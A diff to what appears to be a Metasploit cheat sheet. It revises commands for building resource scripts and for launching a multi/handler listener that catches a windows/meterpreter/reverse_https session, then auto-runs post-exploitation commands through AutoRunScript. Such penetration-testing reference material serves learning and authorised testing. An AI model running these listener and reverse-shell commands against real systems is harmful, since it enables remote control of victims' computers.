@@ -85,7 +85,7 @@
       msf exploit(multi/handler) > set LPORT 666
       msf exploit(multi/handler) > exploit
 
-      msf exploit(multi/handler) > makerc my_handler.rc
+      msf exploit(multi/handler) > makerc /root/my_resource_file.rc
 
     `[run]` msf > resource /root/my_resource_file.rc
 
@@ -99,7 +99,7 @@
 
 ## Run RC through AutoRunScript
 
-- **metasploit prompt::**`[metasploit prompt]`<br />
+- **RC::AutoRunScript::**`[resource_script.rc]`<br />
 
       set AutoRunScript /root/my_resource_file.rc
 
@@ -113,9 +113,9 @@
 
 ## POST EXPLOITATION
 
-- **AutoRunScript::**`[resource_script.rc]`<br />
+- **Handler::AutoRunScript::**`[bash prompt]`<br />
 
-      sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_command -rc $IPATH/aux/$P0; exploit'
+      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_command -rc /root/my_resource_file.rc; exploit'
 
 <br />
 
